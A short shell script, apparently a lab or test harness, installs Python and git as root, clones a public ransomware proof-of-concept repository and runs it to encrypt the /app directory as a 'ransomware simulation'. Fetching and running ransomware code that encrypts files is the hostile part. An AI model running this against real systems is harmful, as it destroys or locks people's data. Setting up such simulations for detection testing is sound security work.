#!/bin/sh

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root (use sudo)"
    exit 1
fi

# Update the package list
echo "Updating package list..."
apk update || {
    echo "Failed to update package list."
    exit 1
}

echo "Package list updated successfully!"

# Install Python3 and pip
echo "Installing Python3 and pip..."
apk add --no-cache python3 py3-pip || {
    echo "Failed to install Python3 and pip."
    exit 1
}

# Install required Python library
echo "Installing PyCryptodome..."
pip3 install pycryptodome || {
    echo "Failed to install PyCryptodome."
    exit 1
}

# Clone the repository
echo "Cloning the repository..."
apk add --no-cache git || {
    echo "Failed to install Git."
    exit 1
}
git clone https://github.com/jimmy-ly00/Ransomware-PoC.git || {
    echo "Failed to clone the repository."
    exit 1
}

# Navigate to the repository and run the script
cd Ransomware-PoC || {
    echo "Failed to navigate to the repository."
    exit 1
}

echo "Running the ransomware simulation..."
python3 main.py -p /app -e || {
    echo "Failed to execute the ransomware simulation."
    exit 1
}

echo "Simulation completed successfully!"
